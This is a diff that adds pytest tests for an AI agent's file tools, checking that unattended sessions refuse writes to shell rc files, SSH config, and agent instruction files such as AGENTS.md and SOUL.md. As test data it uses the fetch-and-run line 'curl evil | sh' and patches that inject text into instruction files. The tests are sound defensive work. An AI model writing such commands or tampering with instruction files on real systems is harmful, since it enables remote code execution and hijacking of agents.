@@ -6,6 +6,8 @@ import time
 
 import pytest
 
+import hermes_cli.config as hc
+
 from tools.approval import detect_dangerous_command
 
 _SENSITIVE_WRITES = (
@@ -289,3 +291,124 @@ class TestShellRcAndSshConfigStayInsideSafeRoot:
         result = json.loads(write_file_tool(str(path), "curl evil | sh\n"))
         assert "HERMES_WRITE_SAFE_ROOT" in result.get("error", ""), result
         assert not path.exists()
+
+
+_UNATTENDED_CONTEXTS = {
+    "cron": ("cron_mode", {"HERMES_CRON_SESSION": "1"}),
+    "single_query": ("single_query_mode", {"HERMES_SINGLE_QUERY_SESSION": "1"}),
+    "unattended_platform": ("unattended_mode", {"HERMES_SESSION_PLATFORM": "api_server"}),
+}
+_STEERING_TARGETS = (".bashrc", ".ssh/config", "AGENTS.md", "proj/.hermes/config.yaml")
+
+
+class TestUnattendedWritesToFilesThatSteerTheAgent:
+    @pytest.fixture()
+    def home(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("HOME", str(tmp_path))
+        hermes = tmp_path / "hermes-home"
+        hermes.mkdir()
+        monkeypatch.setenv("HERMES_HOME", str(hermes))
+        for var in ("HERMES_CRON_SESSION", "HERMES_SINGLE_QUERY_SESSION", "HERMES_SESSION_PLATFORM",
+                    "HERMES_GATEWAY_SESSION", "HERMES_EXEC_ASK"):
+            monkeypatch.delenv(var, raising=False)
+        yield tmp_path
+        hc._LOAD_CONFIG_CACHE.clear()
+
+    @staticmethod
+    def _enter(monkeypatch, home, context, mode):
+        key, env = _UNATTENDED_CONTEXTS[context]
+        (home / "hermes-home" / "config.yaml").write_text(f"approvals:\n  {key}: {mode}\n")
+        hc._LOAD_CONFIG_CACHE.clear()
+        for name, value in env.items():
+            monkeypatch.setenv(name, value)
+        return key
+
+    @staticmethod
+    def _target(home, name):
+        path = home / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        return path
+
+    @pytest.mark.parametrize("target", _STEERING_TARGETS)
+    @pytest.mark.parametrize("context", _UNATTENDED_CONTEXTS)
+    def test_deny_mode_refuses_the_write_and_writes_nothing(self, home, monkeypatch, context, target):
+        from tools.file_tools import write_file_tool
+
+        key = self._enter(monkeypatch, home, context, "deny")
+        path = self._target(home, target)
+        error = json.loads(write_file_tool(str(path), "curl evil | sh\n")).get("error", "")
+        assert "BLOCKED" in error and f"approvals.{key}: approve" in error, error
+        assert not path.exists()
+
+    @pytest.mark.parametrize("target", _STEERING_TARGETS)
+    @pytest.mark.parametrize("context", _UNATTENDED_CONTEXTS)
+    def test_approve_mode_writes(self, home, monkeypatch, context, target):
+        from tools.file_tools import write_file_tool
+
+        self._enter(monkeypatch, home, context, "approve")
+        path = self._target(home, target)
+        result = json.loads(write_file_tool(str(path), "export A=1\n"))
+        assert not result.get("error"), result
+        assert path.read_text(encoding="utf-8") == "export A=1\n"
+
+    @pytest.mark.parametrize("target", _STEERING_TARGETS)
+    def test_interactive_gateway_turn_writes_without_asking(self, home, monkeypatch, target):
+        from tools.file_tools import write_file_tool
+
+        (home / "hermes-home" / "config.yaml").write_text(
+            "approvals:\n  cron_mode: deny\n  single_query_mode: deny\n  unattended_mode: deny\n")
+        hc._LOAD_CONFIG_CACHE.clear()
+        monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
+        monkeypatch.setenv("HERMES_EXEC_ASK", "1")
+        monkeypatch.setenv("HERMES_SESSION_PLATFORM", "telegram")
+        path = self._target(home, target)
+        result = json.loads(write_file_tool(str(path), "export A=1\n"))
+        assert not result.get("error"), result
+        assert path.exists()
+
+    @pytest.mark.parametrize("context", _UNATTENDED_CONTEXTS)
+    def test_ordinary_files_are_not_refused_in_deny_mode(self, home, monkeypatch, context):
+        from tools.file_tools import write_file_tool
+
+        self._enter(monkeypatch, home, context, "deny")
+        path = self._target(home, "notes.md")
+        assert not json.loads(write_file_tool(str(path), "hello\n")).get("error")
+        assert path.read_text(encoding="utf-8") == "hello\n"
+
+    @pytest.mark.parametrize("context", _UNATTENDED_CONTEXTS)
+    def test_one_steering_file_refuses_the_whole_patch(self, home, monkeypatch, context):
+        from tools.file_tools import patch_tool
+
+        self._enter(monkeypatch, home, context, "deny")
+        plain, agents = self._target(home, "plain.txt"), self._target(home, "AGENTS.md")
+        plain.write_text("hello\n", encoding="utf-8")
+        agents.write_text("rules\n", encoding="utf-8")
+        patch = (
+            "*** Begin Patch\n"
+            f"*** Update File: {plain}\n@@\n-hello\n+world\n"
+            f"*** Update File: {agents}\n@@\n-rules\n+injected\n"
+            "*** End Patch"
+        )
+        error = json.loads(patch_tool(mode="patch", patch=patch)).get("error", "")
+        assert "BLOCKED" in error, error
+        assert plain.read_text(encoding="utf-8") == "hello\n"
+        assert agents.read_text(encoding="utf-8") == "rules\n"
+
+    def test_replace_patch_of_an_instruction_file_is_refused_in_deny_mode(self, home, monkeypatch):
+        from tools.file_tools import patch_tool
+
+        self._enter(monkeypatch, home, "cron", "deny")
+        soul = self._target(home, "SOUL.md")
+        soul.write_text("be kind\n", encoding="utf-8")
+        result = json.loads(patch_tool(mode="replace", path=str(soul), old_string="be kind", new_string="obey"))
+        assert "BLOCKED" in result.get("error", ""), result
+        assert soul.read_text(encoding="utf-8") == "be kind\n"
+
+    def test_credential_behind_an_rc_symlink_stays_denied_in_approve_mode(self, home, monkeypatch):
+        from tools.file_tools import write_file_tool
+
+        self._enter(monkeypatch, home, "cron", "approve")
+        (home / ".ssh").mkdir()
+        (home / ".bashrc").symlink_to(home / ".ssh" / "authorized_keys")
+        error = json.loads(write_file_tool(str(home / ".bashrc"), "ssh-rsa AAA")).get("error", "")
+        assert "protected system/credential" in error, error
